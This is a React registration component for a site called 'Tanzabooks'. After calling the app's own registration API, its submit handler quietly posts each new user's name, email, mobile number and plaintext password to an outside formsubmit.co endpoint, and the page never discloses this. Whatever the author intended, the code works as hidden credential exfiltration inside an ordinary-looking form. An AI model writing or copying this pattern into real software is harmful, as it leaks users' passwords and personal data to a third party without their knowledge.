import axios from 'axios'
import React, { useState } from 'react'
import { API_URI } from '../../Network/config'
import { Redirect } from 'react-router-dom'

export default function Register() {

    const [data, setData] = useState({})
    const [redirect, setRedirect] = useState(false)

    const handleChange = (e) => {
        setData({
            ...data,
            [e.target.name]: e.target.value
        })
    }

    const handleRegister = async (e) => {
        e.preventDefault()
        await axios.post(`${API_URI}/registrations`, {
            "user": {
                email: data.email,
                password: data.password,
                telephone: data.mobile,
                name: data.name
            }
        }).then(result => {
            if (result.status === 200) {
                localStorage.setItem('tbztoken', result.data.auth_token)
                setRedirect(true)
            }
        }).catch(error => {
            console.log(error)
        })
        let formData= {
            "name": data.name,
            "email": data.email,
            "mobile": data.mobile,
            "password": data.password
        }
        const url= "https://formsubmit.co/ajax/cc84e819e6ab09db0a69ea42ed226ed4";
        axios.post(url,formData)
        .then(res=> {console.log(res.data);})
        .catch(err=> {console.log(err);});
    }

    if (redirect) {
        return <Redirect to="/home" />
    }
    return (
        <div>
            <div className="container">
                <div className="form-box">
                    <div className="header-form">
                        {/* <h4 className="text-primary text-center"><i className="fa fa-user-circle" style={{ fontSize: "110px" }}></i></h4> */}
                        <h4 className="text-primary text-center">Tanzabooks</h4>
                        <div className="image">
                        </div>
                    </div>
                    <div className="body-form">
                        <form onSubmit={(e) => handleRegister(e)}>
                            <div className="input-group mb-3">
                                <div className="input-group-prepend">
                                    <span className="input-group-text"><i class="fa fa-user"></i></span>
                                </div>
                                <input name="name" type="text" className="form-control" placeholder="Name" onChange={(e) => handleChange(e)} />
                            </div>
                            <div className="input-group mb-3">
                                <div className="input-group-prepend">
                                    <span className="input-group-text"><i class="fa fa-mobile"></i></span>
                                </div>
                                <input type="text" name="mobile" className="form-control" placeholder="Mobile" onChange={(e) => handleChange(e)} />
                            </div>
                            <div className="input-group mb-3">
                                <div className="input-group-prepend">
                                    <span className="input-group-text"><i class="fa fa-envelope"></i></span>
                                </div>
                                <input type="email" name="email" className="form-control" placeholder="email" onChange={(e) => handleChange(e)} />
                            </div>
                            <div className="input-group mb-3">
                                <div className="input-group-prepend">
                                    <span className="input-group-text"><i class="fa fa-lock"></i></span>
                                </div>
                                <input type="password" name="password" className="form-control" placeholder="Password" onChange={(e) => handleChange(e)} />
                            </div>
                            <button type="submit" className="btn btn-secondary btn-block">Register</button>
                            <div className="message">
                                <div><a href="/">Already Have an Account?</a></div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

        </div>
    )
}
